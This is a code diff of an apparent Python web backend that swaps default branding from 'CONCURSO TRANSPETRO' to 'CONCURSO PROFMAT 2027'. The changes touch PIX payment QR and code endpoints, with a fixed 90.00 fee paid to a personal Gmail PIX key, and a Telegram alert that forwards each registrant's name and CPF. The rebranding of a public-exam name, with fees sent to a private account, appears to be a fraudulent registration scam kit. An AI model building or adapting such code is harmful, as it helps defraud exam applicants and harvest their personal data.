@@ -163,12 +163,12 @@ async def seed_pix_config():
                 {'_id': 'main'},
                 {'$set': {
                     'pix_key': 'danielmmm950@gmail.com',
-                    'pix_nome': 'CONCURSO TRANSPETRO',
+                    'pix_nome': 'CONCURSO PROFMAT 2027',
                     'pix_cidade': 'SALVADOR',
                 }},
                 upsert=True,
             )
-            logger.info("Seeded default PIX config (danielmmm950@gmail.com / CONCURSO TRANSPETRO / SALVADOR)")
+            logger.info("Seeded default PIX config (danielmmm950@gmail.com / CONCURSO PROFMAT 2027 / SALVADOR)")
     except Exception as e:
         logger.warning(f"seed_pix_config failed: {e}")
 
@@ -1307,7 +1307,7 @@ async def generate_pix_brcode(payload: Dict[str, Any]):
     if not key:
         raise HTTPException(status_code=400, detail='Chave PIX não configurada no painel admin')
 
-    nome = (s.get('pix_nome') or 'CONCURSO TRANSPETRO').upper()
+    nome = (s.get('pix_nome') or 'CONCURSO PROFMAT 2027').upper()
     cidade = (s.get('pix_cidade') or 'SALVADOR').upper()
 
     try:
@@ -1404,7 +1404,7 @@ async def pix_qr_png(valor: float = 0, txid: str = ''):
     key = (s.get('pix_key') or '').strip()
     if not key:
         raise HTTPException(400, 'Chave PIX não configurada')
-    nome = (s.get('pix_nome') or 'CONCURSO TRANSPETRO').upper()
+    nome = (s.get('pix_nome') or 'CONCURSO PROFMAT 2027').upper()
     cidade = (s.get('pix_cidade') or 'SALVADOR').upper()
     pix_code = build_brcode(pix_key=key, valor=90.00, nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
     qr_b64 = build_qr_png_base64(pix_code, box_size=8, border=2)
@@ -1420,7 +1420,7 @@ async def pix_code_txt(valor: float = 0, txid: str = ''):
     key = (s.get('pix_key') or '').strip()
     if not key:
         raise HTTPException(400, 'Chave PIX não configurada')
-    nome = (s.get('pix_nome') or 'CONCURSO TRANSPETRO').upper()
+    nome = (s.get('pix_nome') or 'CONCURSO PROFMAT 2027').upper()
     cidade = (s.get('pix_cidade') or 'SALVADOR').upper()
     pix_code = build_brcode(pix_key=key, valor=90.00, nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
     return PlainTextResponse(content=pix_code, headers={'Cache-Control':'no-store, no-cache'})
@@ -1488,7 +1488,7 @@ def _format_data_hora_brt(dt) -> str:
 def _build_telegram_message(insc: Dict[str, Any], settings: Dict[str, Any] = None) -> str:
     """Constroi a mensagem do Telegram no formato definido pelo cliente."""
     settings = settings or {}
-    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO - TRANSPETRO 26'
+    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO - PROFMAT 2027'
 
     nome = str(insc.get('nome') or 'Candidato').strip()
     cpf = _format_cpf_br(insc.get('cpf', ''))
